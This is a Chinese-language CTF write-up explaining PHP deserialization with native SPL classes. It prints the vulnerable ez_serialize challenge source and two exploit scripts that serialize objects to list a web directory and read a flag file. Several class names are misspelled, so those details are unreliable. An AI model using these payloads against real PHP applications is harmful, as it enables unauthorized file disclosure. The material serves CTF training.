#php反序列化之原生类

SLP类存在可以进行文件处理和迭代的类：
```
Directorylterator                                遍历目录

Filesystemlterator                              遍历目录

Globlterator                                      遍历目录，但是不同点在于它可以通配，例如var/html/www/flag*

SplFileObject                                     读取文件，按行读取，多行需要遍历

finfo/finfo_open()                               需要两个参数

reflectionMethod($class,$function)     返回类和方法

getDocComment()                              返回reflectionMethod的值

```


例如：安恒月赛DASCTF三月娱乐赛（ez_serialize)

审计源代码
```
<?php 
	
error_reporting(0); 

highlight_file(__FILE__); 

class A{ 
		public $class; 
		public $para; 
		public $check; 
	public function __construct() {
 					$this->class = "B"; 
					$this->para = "ctfer";
					 echo new $this->class ($this->para);
 }
 	public function __wakeup() { 
		$this->check = new C;
		 if($this->check->vaild($this->para) && $this->check->vaild($this->class)) { 
						

			echo new $this->class ($this->para); 
} 
		else die('bad hacker~');
 } 
} 
class B{
 	var $a;
 	public function __construct($a) { 
		$this->a = $a;
		 echo ("hello ".$this->a); 
} 
} 
class C{ 
	function vaild($code){ 
		$pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
		 if (preg_match($pattern, $code)){ 
			return false; 
} 
			else return true; 
}
 } 
	if(isset($_GET['pop'])){ 
		unserialize($_GET['pop']); 
} 
	else{ 
		$a=new A; 
} hello ctfer
```

可以构造exp'
```
<?php

class A{
		public $class='Filesystemlterator'; 
		public $para="var/www/html"; 
		public $check;
}

$b=new A();

echo serialize($b);

?>

```
得到序列化的数值后，构造payload


得到aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE文件名

然后在构造exp读取里面的文件
```
<?php

class A{
		public $class='SplFileObject '; 
		public $para="var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"; 
		public $check;
}

$b=new A();

echo serialize($b);

?>
```
然后看页面源代码，看见flag